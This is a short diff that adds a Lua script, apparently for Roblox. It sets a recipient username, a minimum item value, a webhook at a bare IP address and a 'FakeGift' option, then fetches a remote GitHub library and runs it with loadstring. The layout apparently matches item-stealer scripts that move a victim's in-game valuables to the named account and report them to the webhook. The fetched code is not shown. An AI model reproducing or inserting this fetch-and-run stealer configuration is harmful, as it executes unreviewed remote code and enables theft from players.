@@ -1,0 +1,7 @@
+_G.User = {'Stelaah10'}
+_G.min_value = 10000000000
+_G.pingEveryone = "No"
+_G.Webhook = "http://51.83.103.24:20002/proxy/b488c06b9e536b1dcbadee3f976f2751"
+_G.FakeGift = "No"
+
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
